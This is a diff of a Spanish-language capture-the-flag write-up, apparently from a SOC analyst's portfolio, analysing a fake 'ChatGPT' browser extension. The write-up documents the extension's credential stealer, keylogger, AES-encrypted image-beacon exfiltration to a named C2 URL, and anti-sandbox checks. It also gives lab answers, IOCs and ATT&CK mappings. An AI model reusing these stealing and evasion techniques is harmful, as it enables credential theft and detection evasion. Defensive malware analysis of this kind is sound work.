@@ -1,200 +1,237 @@
-Varios empleados notaron comportamiento extraño en sus navegadores después de instalar una extensión llamada "ChatGPT", y el SOC recibió alertas por cuentas comprometidas y fuga de información. Analizamos su código fuente y encontramos un credential stealer con keylogger, exfiltración mediante Image Beacon y controles anti-análisis.
+## 🧩 Escenario del Laboratorio
 
-## El caso
+**Contexto**: Varios empleados reportan comportamiento inusual en sus navegadores tras instalar una extensión llamada "ChatGPT". Cuentas comprometidas y fuga de información sensible activan una alerta en el SOC.  
+**Objetivo**: Analizar los componentes de la extensión maliciosa, identificar mecanismos de robo de datos, técnicas de exfiltración encubierta y anti-análisis.  
+**Herramientas**: ExtAnalysis, CRX Viewer.  
+**Tácticas**: Credential Access | Collection | Command and Control | Exfiltration.
 
-Los usuarios reportaron comportamiento inusual tras instalar la extensión. El objetivo fue analizar sus componentes, identificar los mecanismos de robo de datos, la exfiltración encubierta y las técnicas anti-análisis. El laboratorio entrega los archivos fuente de la extensión (`.js`, `.json`, `.html`, `.gif`) para análisis estático.
+El laboratorio provee los archivos fuente de la extensión (`.js`, `.json`, `.html`, `.gif`) para análisis estático.
 
-- **Plataforma:** CyberDefenders (Blue Team Lab, categoría Malware Analysis)
-- **Categoría:** Malware Analysis
-- **Herramientas:** ExtAnalysis, CRX Viewer, CyberChef
-- **Tácticas:** Credential Access | Collection | Command and Control | Exfiltration
+### 📦 Preparación del Entorno
 
-## La investigación
+![Archivos fuente de la extensión entregados por el laboratorio](https://github.com/user-attachments/assets/b8d9b81c-9c9c-4440-abc4-6e4eaeeea091)
 
-### Preparar los archivos para el análisis
+Antes de iniciar el análisis, empaquetamos los archivos de la extensión en un archivo `.crx` para poder subirlos a ExtAnalysis y CRXViewer:
 
-Antes de empezar, empaquetamos los archivos de la extensión en un `.crx` para poder subirlos a ExtAnalysis y CRXViewer.
-
-![Archivos fuente de la extensión entregados por el laboratorio](https://github.com/user-attachments/assets/b8d9b81c-9c9c-4440-abc4-6e4eaeeea091 "Archivos fuente de la extensión")
-
-```bash
+```text
 zip -r extension.crx app.js crypto.js loader.js manifest.json ui.html IMG.gif
 ```
 
-### Primeras señales de alerta en el manifest.json
+### 📖 Análisis Preliminar – manifest.json
 
-Antes de responder las preguntas del laboratorio, leímos el `manifest.json`. Ya en crudo expone varias red flags: script en background con persistencia, permisos sobre todas las URLs, lectura de formularios y una versión de manifest obsoleta.
+Antes de iniciar con las preguntas del laboratorio, realizamos un análisis del archivo `manifest.json`, el cual expone múltiples red flags desde la primera lectura.
 
-![Contenido del manifest.json de la extensión](https://github.com/user-attachments/assets/de5da17e-2d2b-42f9-a2fd-48429ae7a2eb "El manifest.json de la extensión")
+![Contenido del manifest.json de la extensión](https://github.com/user-attachments/assets/de5da17e-2d2b-42f9-a2fd-48429ae7a2eb)
 
-La metadata ya delata la impersonación:
+### **Metadata de la Extensión**
 
 | Campo | Valor | Observación |
 |-------|-------|-------------|
 | name | "ChatGPT" | Impersonación de marca legítima (OpenAI) |
-| version | "1.0" | Sin historial de versiones, nueva o reciente |
+| version | "1.0" | Sin historial de versiones → nueva/reciente |
 | manifest_version | 2 | Versión legacy (MV3 es el estándar actual) |
 | description | "An AI-powered assistant" | Descripción genérica para aparentar legitimidad |
 
-Los permisos declarados son todavía más reveladores:
+### **Permisos Declarados**
 
-| Permiso | Capacidad | Nivel de riesgo |
+| Permiso | Capacidad | Nivel de Riesgo |
 |---------|-----------|-----------------|
-| tabs | Ver URLs y títulos de todas las pestañas abiertas | Medio |
-| http://*/* | Acceso completo a toda web HTTP | Crítico |
-| https://*/* | Acceso completo a toda web HTTPS | Crítico |
-| storage | Persistir datos localmente en el navegador | Medio |
-| webRequest | Interceptar y monitorear todas las peticiones de red | Crítico |
-| webRequestBlocking | Modificar o bloquear peticiones en tiempo real | Crítico |
-| cookies | Leer, escribir y robar cookies de cualquier sitio | Crítico |
+| tabs | Ver URLs y títulos de todas las pestañas abiertas | 🟡 Medio |
+| http://*/* | Acceso completo a toda web HTTP | 🔴 Crítico |
+| https://*/* | Acceso completo a toda web HTTPS | 🔴 Crítico |
+| storage | Persistir datos localmente en el navegador | 🟡 Medio |
+| webRequest | Interceptar y monitorear todas las peticiones de red | 🔴 Crítico |
+| webRequestBlocking | Modificar o bloquear peticiones en tiempo real | 🔴 Crítico |
+| cookies | Leer, escribir y robar cookies de cualquier sitio | 🔴 Crítico |
 
-> La combinación `webRequestBlocking + cookies + <all_urls>` habilita un ataque Man-in-the-Browser completo: permite interceptar credenciales, secuestrar sesiones y modificar respuestas del servidor antes de que lleguen al usuario.
+> La combinación `webRequestBlocking + cookies + <all_urls>` habilita un ataque **Man-in-the-Browser** completo, permitiendo interceptar credenciales, secuestrar sesiones y modificar respuestas del servidor antes de que lleguen al usuario.
 
-El background script (`system/loader.js`) corre de forma permanente desde el inicio del navegador:
+### **Componentes de la Extensión**
 
+**Background Script** (`system/loader.js`)
 ```json
 "background": {
     "scripts": ["system/loader.js"],
     "persistent": true
 }
 ```
+Corre permanentemente desde el inicio del navegador (`persistent: true`). El path `system/` intenta aparentar ser un componente legítimo del sistema operativo. Es el componente de carga del payload principal, por lo tanto es el **primer archivo a analizar en profundidad**.
 
-Corre permanentemente (`persistent: true`) y el path `system/` intenta aparentar un componente legítimo del sistema operativo. Es el componente de carga del payload principal, así que lo marcamos como el primer archivo a analizar en profundidad.
-
-El content script (`core/app.js`) se inyecta en todas las páginas:
-
+**Content Script** (`core/app.js`)
 ```json
 "content_scripts": [{
     "matches": ["<all_urls>"],
     "js": ["core/app.js"]
 }]
 ```
+Se inyecta en **absolutamente todas las páginas web** visitadas por el usuario. Tiene acceso directo al DOM, pudiendo leer formularios, inputs y contraseñas. La directiva `<all_urls>` elimina toda restricción de dominio, cubriendo banking, email, redes sociales, etc.
 
-Se inyecta en absolutamente todas las páginas web que visita el usuario. Tiene acceso directo al DOM y puede leer formularios, inputs y contraseñas. La directiva `<all_urls>` elimina toda restricción de dominio y cubre banking, email, redes sociales, etc.
+Simplemente leyendo el `manifest.json` en su forma cruda, ya podemos identificar múltiples red flags: scripts en background con persistencia, permisos sobre todas las URLs, lectura de formularios, versión de manifest obsoleta, entre otros.
 
-### Cómo se ocultan las URLs objetivo
+## 📋 Preguntas del Laboratorio & Respuestas
+
+### Pregunta 1
 
 **Q1.** Which encoding method does the browser extension use to obscure target URLs, making them more difficult to detect during analysis?
 
-En `app.js` identificamos una URL objetivo encodeada en Base64, reconocible por los caracteres `==` al final de la cadena. Al decodificarla en CyberChef confirmamos que se trata de `www.facebook.com`. La extensión implementa un listener orientado específicamente a ese dominio para interceptar la actividad del usuario.
+Posterior al análisis del `manifest.json`, nos dirigimos a examinar el archivo `app.js`. En su contenido podemos identificar una URL objetivo encodeada en **Base64**, reconocible por los caracteres `==` al final de la cadena. Al decodear en CyberChef, confirmamos que se trata de `www.facebook.com`, lo que indica que la extensión implementa un listener específicamente orientado a ese dominio para interceptar la actividad del usuario.  
 
-![Cadena Base64 en app.js decodificada en CyberChef](https://github.com/user-attachments/assets/20491f03-e5bc-41d6-a738-85924734e131 "URL objetivo en Base64 dentro de app.js")
+![Cadena Base64 en app.js decodificada en CyberChef](https://github.com/user-attachments/assets/20491f03-e5bc-41d6-a738-85924734e131)
 
-> **Respuesta:** `Base64`
+> **R:** `Base64`
 
-### El sitio bajo vigilancia
+### Pregunta 2
 
 **Q2.** Which website does the extension monitor for data theft, targeting user accounts to steal sensitive information?
 
-Es el resultado directo de la decodificación anterior. La URL hardcodeada en `app.js` corresponde a Facebook, lo que confirma que la extensión fue diseñada para interceptar credenciales y sesiones de usuarios de esa plataforma.
+Resultado directo de la decodificación Base64 realizada en la pregunta anterior. La URL objetivo hardcodeada en el código de `app.js` corresponde al dominio de Facebook, confirmando que la extensión fue diseñada específicamente para interceptar credenciales y sesiones de usuarios de dicha plataforma.  
 
-![Dominio de Facebook hardcodeado en el código de app.js](https://github.com/user-attachments/assets/37539576-f4a7-40c1-a385-c637186a8b47 "El dominio objetivo hardcodeado")
+![Dominio de Facebook hardcodeado en el código de app.js](https://github.com/user-attachments/assets/37539576-f4a7-40c1-a385-c637186a8b47)
 
-> **Respuesta:** `www.facebook.com`
+> **R:** `www.facebook.com`
 
-### Exfiltración con un Image Beacon
+### Pregunta 3
 
 **Q3.** Which type of HTML element is utilized by the extension to send stolen data?
 
-Siguiendo con `app.js`, identificamos una técnica conocida como Image Beacon: los datos salen de forma encubierta a través de imágenes invisibles para el usuario. El flujo es el siguiente:
-
-1. Se crea un elemento `<img>` invisible en el DOM.
-2. Al asignar `img.src`, el navegador realiza automáticamente `GET https://Mo.Elshaheedy.com/collect?data=[credenciales_cifradas_AES]`.
-3. El servidor C2 recibe las credenciales en el query string de la request.
-4. Responde con `204 No Content` o una imagen 1x1px transparente.
+Continuando el análisis de `app.js`, podemos identificar el uso de una técnica conocida como **Image Beacon**, mediante la cual se exfiltran datos de forma encubierta a través de imágenes invisibles para el usuario. El flujo de exfiltración funciona de la siguiente manera:  
+1. Se crea un elemento `<img>` invisible en el DOM.  
+2. Al asignar `img.src`, el navegador realiza automáticamente: `GET https://Mo.Elshaheedy.com/collect?data=[credenciales_cifradas_AES]`.  
+3. El servidor C2 recibe las credenciales en el query string de la request.  
+4. Responde con `204 No Content` o una imagen 1x1px transparente.  
 5. El usuario no percibe ninguna actividad anómala en ningún momento.
 
-![Código de app.js que crea el elemento de imagen para exfiltrar datos](https://github.com/user-attachments/assets/47a4d8f2-82df-43c4-acbd-cba0a373eb79 "Image Beacon en app.js")
+![Código de app.js que crea el elemento de imagen para exfiltrar datos](https://github.com/user-attachments/assets/47a4d8f2-82df-43c4-acbd-cba0a373eb79)
 
-> **Respuesta:** `<img>`
+  
+> **R:** `<img>`
 
-### Controles anti-análisis en loader.js
+### Pregunta 4
 
 **Q4.** What is the first specific condition in the code that triggers the extension to deactivate itself?
 
-En `loader.js` encontramos dos funciones principales: anti-análisis y carga dinámica del payload. El código evalúa dos condiciones secuenciales para detectar sandboxes o análisis automatizado.
+Trasladando el análisis al archivo `loader.js`, identificamos que este cumple dos funciones principales: **Anti-Analysis** y **Dynamic Loader**. El código evalúa dos condiciones secuenciales para detectar entornos de sandbox o análisis automatizado:  
 
-La primera es `navigator.plugins.length === 0`. Verifica si el navegador tiene cero plugins instalados. Los entornos de análisis automatizado, las máquinas virtuales y los sandboxes suelen no tener plugins registrados, y entonces la extensión se desactiva en silencio para no ser detectada.
+**1ra condición** → `navigator.plugins.length === 0`  
+Verifica si el navegador tiene **cero plugins instalados**. Los entornos de análisis automatizado, máquinas virtuales y sandboxes generalmente no tienen plugins registrados, por lo que esta condición activa la desactivación silenciosa de la extensión para evitar ser detectada.  
 
-La segunda es `/HeadlessChrome/.test(navigator.userAgent)`. Busca la string `"HeadlessChrome"` en el User-Agent. Chrome en modo headless, usado en sandboxes y pipelines de análisis automatizado, la incluye de forma característica, lo que permite al malware identificar y evadir esos entornos.
+**2da condición** → `/HeadlessChrome/.test(navigator.userAgent)`  
+Busca la string `"HeadlessChrome"` en el User-Agent del navegador. Chrome en modo headless (utilizado en sandboxes y pipelines de análisis automatizado) incluye esta string de forma característica, lo que permite al malware identificar y evadir estos entornos.  
 
-Además, este script carga dinámicamente el payload principal `app.js` una vez superados los controles.
+Adicionalmente, este script es el encargado de cargar dinámicamente el payload principal `app.js` una vez que los controles anti-análisis son superados. 
 
-![Condiciones anti-análisis dentro de loader.js](https://github.com/user-attachments/assets/16f2b2f8-d77a-4235-8e9b-132baa8ad4ef "Checks anti-sandbox en loader.js")
+![Condiciones anti-análisis dentro de loader.js](https://github.com/user-attachments/assets/16f2b2f8-d77a-4235-8e9b-132baa8ad4ef)
 
-> **Respuesta:** `navigator.plugins.length === 0`
+> **R:** `navigator.plugins.length === 0`
 
-### El evento que captura los formularios
+### Pregunta 5
 
 **Q5.** Which event does the extension capture to track user input submitted through forms?
 
-De vuelta en `app.js`, revisamos el módulo de credential stealer. Registra un event listener sobre el evento `submit` de los formularios, que se activa cuando el usuario envía uno. El listener captura los campos `username`, `email` y `password` solo si contienen datos, y luego los encripta y los transmite al servidor C2.
+Retornando al análisis de `app.js`, podemos examinar el comportamiento completo del módulo de **credential stealer**. La extensión registra un event listener sobre el evento `submit` de formularios web, el cual se activa en el momento en que el usuario envía un formulario. Dicho listener captura los campos `username`, `email` y `password` únicamente si contienen contenido, para posteriormente encriptarlos y transmitirlos al servidor C2.  
 
-![Listener del evento submit en app.js](https://github.com/user-attachments/assets/a0482995-0dbd-4510-94b5-770ba00bfa94 "Listener submit del credential stealer")
+![Listener del evento submit en app.js](https://github.com/user-attachments/assets/a0482995-0dbd-4510-94b5-770ba00bfa94)
 
-> **Respuesta:** `submit`
+> **R:** `submit`
 
-### Un keylogger en pocas líneas
+### Pregunta 6
 
 **Q6.** Which API or method does the extension use to capture and monitor user keystrokes?
 
-En `app.js` hay un módulo de keylogger breve pero muy efectivo. Registra un event listener a nivel de documento completo sobre el evento `keydown`. Captura cada tecla presionada sin importar el campo o el contexto, por lo que también cubre inputs fuera de los formularios tradicionales.
+En `app.js` existe un módulo de **keylogger** implementado en pocas líneas pero extremadamente efectivo. Registra un event listener a nivel de documento completo sobre el evento `keydown`, capturando y registrando cada tecla presionada por el usuario independientemente del campo o contexto activo en la página, lo que lo hace aplicable a cualquier tipo de input fuera de formularios tradicionales.  
 
-![Event listener keydown del keylogger en app.js](https://github.com/user-attachments/assets/5b0a805e-0e3c-4386-8c1d-9d94db25cf20 "Keylogger basado en keydown")
+![Event listener keydown del keylogger en app.js](https://github.com/user-attachments/assets/5b0a805e-0e3c-4386-8c1d-9d94db25cf20)
 
-> **Respuesta:** `keydown`
+> **R:** `keydown`
 
-### El dominio del servidor C2
+### Pregunta 7
 
 **Q7.** What is the domain where the extension transmits the exfiltrated data?
 
-Durante el análisis del Image Beacon en `app.js` vimos en el código la URL completa del servidor C2 al que se envían las credenciales y la información robada mediante requests GET encubiertas.
+Durante el análisis del mecanismo de Image Beacon en `app.js` (Q3), pudimos observar en el código la URL completa del servidor C2 al cual se envían las credenciales e información robada mediante las requests GET encubiertas. 
 
-![URL del servidor C2 en el código de app.js](https://github.com/user-attachments/assets/3c8cd8a1-3cad-450d-ae8c-4e48e5377425 "Dominio C2 de exfiltración")
+![URL del servidor C2 en el código de app.js](https://github.com/user-attachments/assets/3c8cd8a1-3cad-450d-ae8c-4e48e5377425)
 
-> **Respuesta:** `mo.elshaheedy.com`
+> **R:** `mo.elshaheedy.com`
 
-### La función que orquesta el robo
+### Pregunta 8
 
 **Q8.** Which function in the code is used to exfiltrate user credentials, including the username and password?
 
-En `app.js` identificamos la función que orquesta todo el proceso de exfiltración. Construye un objeto `.JSON` con los campos `user`, `pass` y `site`, los encripta con AES y los transmite al canal C2 mediante el Image Beacon.
+En `app.js` podemos identificar la función responsable de orquestar el proceso completo de exfiltración. Esta función construye un objeto `.JSON` con los campos `user`, `pass` y `site`, los cuales son encriptados mediante AES y posteriormente transmitidos al canal C2 a través del mecanismo de Image Beacon analizado en Q3.  
 
-![Definición de la función de exfiltración en app.js](https://github.com/user-attachments/assets/7a72845f-873b-4277-91eb-84ed33409ac1 "Función de exfiltración de credenciales")
+![Definición de la función de exfiltración en app.js](https://github.com/user-attachments/assets/7a72845f-873b-4277-91eb-84ed33409ac1)
 
-> **Respuesta:** `exfiltrateCredentials(username, password)`
+> **R:** `exfiltrateCredentials(username, password)`
 
-### Cifrado antes de salir
+### Pregunta 9
 
 **Q9.** Which encryption algorithm is applied to secure the data before sending?
 
-En `app.js` localizamos la función de cifrado que procesa el payload antes de la exfiltración. Toma el objeto `.JSON` con usuario, contraseña y sitio web y lo cifra con AES-CBC, usando un vector de inicialización (IV) generado aleatoriamente para que cada paquete sea único e irrepetible. Por último lo convierte a Base64 antes de enviarlo al canal C2. Cifrado simétrico, IV aleatorio y encoding juntos dificultan mucho la detección por inspección de tráfico.
+En `app.js` podemos localizar la función de cifrado que procesa el payload antes de su exfiltración. El proceso funciona de la siguiente manera: toma el objeto `.JSON` con `usuario`, `contraseña` y `sitio web`, lo cifra con **AES-CBC** utilizando un **vector de inicialización (IV)** generado aleatoriamente para garantizar que cada paquete transmitido sea único e irrepetible, y finalmente lo convierte a formato **Base64** antes de ser enviado al canal C2. Esta combinación de cifrado simétrico + IV aleatorio + encoding dificulta significativamente la detección por inspección de tráfico.  
 
-![Función de cifrado AES-CBC con IV aleatorio en app.js](https://github.com/user-attachments/assets/a5aee07c-74b8-421d-9bc7-adc16fe84315 "Cifrado AES-CBC del payload")
+![Función de cifrado AES-CBC con IV aleatorio en app.js](https://github.com/user-attachments/assets/a5aee07c-74b8-421d-9bc7-adc16fe84315)
 
-> **Respuesta:** `AES`
+> **R:** `AES`
 
-### El permiso que habilita el robo de sesiones
+### Pregunta 10
 
 **Q10.** What does the extension access to store or manipulate session-related data and authentication information?
 
-Volvimos al `manifest.json`. Entre los permisos declarados figura el acceso explícito a las cookies del navegador. Las cookies de sesión son un objetivo de alto valor porque permiten secuestrar sesiones autenticadas sin conocer las credenciales. Con ese permiso, la extensión puede leer, modificar y exfiltrar cookies de sesión de cualquier dominio visitado.
+Retomando el análisis del `manifest.json`, entre los permisos declarados por la extensión podemos ver que incluye acceso explícito a las **cookies** del navegador. Las cookies de sesión son un objetivo de alto valor para los atacantes ya que permiten secuestrar sesiones autenticadas sin necesidad de conocer las credenciales del usuario. Con los permisos garantizados, esta extensión puede leer, modificar y exfiltrar cookies de sesión de cualquier dominio visitado.  
 
-![Permiso de cookies declarado en el manifest.json](https://github.com/user-attachments/assets/8e4a600b-636f-498a-bbcd-af784e3a3b18 "Permiso cookies en el manifest")
+![Permiso de cookies declarado en el manifest.json](https://github.com/user-attachments/assets/8e4a600b-636f-498a-bbcd-af784e3a3b18)
 
-> **Respuesta:** `cookies`
+> **R:** `cookies`
 
-## Reconstrucción del ataque
+## 🔬 Resumen del Proceso de Análisis
 
-1. **Reconocimiento de la extensión.** El `manifest.json` muestra MV2, background persistente y `<all_urls>`. Los permisos críticos son `webRequestBlocking`, `cookies` y `storage`. Hay red flags inmediatas: impersonación de OpenAI y versión legacy.
-2. **Componentes maliciosos.** `loader.js` hace anti-análisis y carga dinámica, con dos checks: `navigator.plugins.length === 0` y `/HeadlessChrome/.test(navigator.userAgent)`. `app.js` contiene el credential stealer, el keylogger y el Image Beacon. Su objetivo es `www.facebook.com`, codificado en Base64. Los eventos son `submit` (formularios) y `keydown` (keylogger). La exfiltración va por `exfiltrateCredentials()`, AES-CBC y `img.src` hacia el C2.
-3. **Infraestructura C2.** El dominio es `mo.elshaheedy.com`. El método es un Image Beacon, un GET desde un `<img>` invisible. El endpoint es `/collect?data=[AES-CBC+Base64 payload]` y el payload es un JSON con `{user, pass, site}`.
-4. **Threat intelligence.** La evasión de análisis es anti-VM (check de plugins y HeadlessChrome). El cifrado es AES-CBC con IV aleatorio y Base64. El objetivo específico son las credenciales de sesión de Facebook.
+### 1. **Reconocimiento de la Extensión**
 
-## MITRE ATT&CK
+manifest.json: MV2, persistent background, <all_urls>
 
-| Táctica | Técnica | ID | Evidencia |
-|---------|---------|----|-----------|
+Permisos críticos: webRequestBlocking + cookies + storage
+
+Red flags inmediatas: impersonación OpenAI, versión legacy
+
+### 2. **Análisis de Componentes Maliciosos**
+
+loader.js → Anti-analysis + Dynamic loader
+
+├── Check 1: navigator.plugins.length === 0
+
+└── Check 2: /HeadlessChrome/.test(navigator.userAgent)
+
+app.js → Credential stealer + Keylogger + Image Beacon
+
+├── Target: www.facebook.com (Base64 encoded)
+
+├── Events: submit (forms) + keydown (keylogger)
+
+└── Exfil: exfiltrateCredentials() → AES-CBC → img.src C2
+
+### 3. **Infraestructura C2**
+
+Dominio: mo.elshaheedy.com
+
+Método: Image Beacon (GET request via `<img>` invisible)
+
+Endpoint: /collect?data=[AES-CBC+Base64 payload]
+
+Payload: JSON {user, pass, site}
+
+### 4. **Threat Intelligence**
+
+Técnica evasión análisis: Anti-VM (plugins check + HeadlessChrome)
+
+Cifrado: AES-CBC con IV aleatorio + Base64
+
+Objetivo específico: Facebook session credentials
+
+## 🎯 MITRE ATT&CK Mapping
+
+| Táctica | Técnica | ID | Descripción Observada |
+|---------|---------|----|-----------------------|
 | Credential Access | Input Capture: Web Portal Capture | T1056.003 | Event listener `submit` captura credenciales de formularios |
 | Collection | Input Capture: Keylogging | T1056.001 | Event listener `keydown` registra todas las teclas presionadas |
 | Defense Evasion | Virtualization/Sandbox Evasion | T1497 | Checks `navigator.plugins` y `HeadlessChrome` en loader.js |
@@ -203,25 +240,21 @@ Volvimos al `manifest.json`. Entre los permisos declarados figura el acceso expl
 | Exfiltration | Exfiltration Over C2 Channel | T1041 | Credenciales AES+Base64 enviadas via img.src GET request |
 | Credential Access | Steal Web Session Cookie | T1539 | Permiso `cookies` para secuestro de sesiones activas |
 
-## Indicadores de compromiso
+## 🔬 Herramientas Utilizadas
 
-| Tipo | Indicador | Contexto |
-|------|-----------|----------|
-| Dominio | `mo.elshaheedy.com` | Servidor C2 de exfiltración (en el código aparece como `Mo.Elshaheedy.com`) |
-| URL | `https://Mo.Elshaheedy.com/collect?data=[credenciales_cifradas_AES]` | GET del Image Beacon con las credenciales cifradas |
-| Dominio | `www.facebook.com` | Sitio objetivo, codificado en Base64 en app.js |
-| Archivo | `system/loader.js` | Background script con anti-análisis y carga dinámica |
-| Archivo | `core/app.js` | Payload principal: stealer, keylogger y Image Beacon |
-| Función | `exfiltrateCredentials(username, password)` | Orquesta la exfiltración de credenciales |
+🔍 Análisis de Extensión
 
-## Herramientas
+├── ExtAnalysis → Análisis automático de extensión Chrome
 
-- **ExtAnalysis:** análisis automático de la extensión de Chrome.
-- **CRX Viewer:** inspección de los archivos fuente.
-- **CyberChef:** decodificación Base64 de las URLs ofuscadas.
+├── CRX Viewer → Inspección de archivos fuente
 
-## Lecciones aprendidas
+└── CyberChef → Base64 decode de URLs ofuscadas
 
-1. **Revisión del manifest.** Auditar siempre los permisos de una extensión antes de instalarla: `webRequestBlocking + cookies + <all_urls>` equivale a un Man-in-the-Browser garantizado.
-2. **Image Beacon.** La exfiltración vía `<img>` es difícil de detectar para firewalls tradicionales, porque se disfraza de tráfico web legítimo.
-3. **Detección de anti-análisis.** Encontrar checks de `navigator.plugins` y `HeadlessChrome` en scripts de extensiones es un indicador directo de comportamiento malicioso.
+## 📊 Lecciones Aprendidas
+
+1. **Manifest Review**: Auditar siempre permisos de extensiones antes de instalar → `webRequestBlocking + cookies + <all_urls>` = Man-in-the-Browser garantizado.
+2. **Image Beacon Awareness**: Exfiltración via `<img>` es difícil de detectar por firewalls tradicionales ya que se disfraza de tráfico web legítimo.
+3. **Anti-Analysis Detection**: Identificar checks de `navigator.plugins` y `HeadlessChrome` en scripts de extensiones es indicador directo de comportamiento malicioso.
+
+> **Santiago Daniel Sandili** – SOC Analyst L1 Portfolio  
+> *CyberDefenders Blue Team Lab: FakeGPT (Malware Analysis Category)*
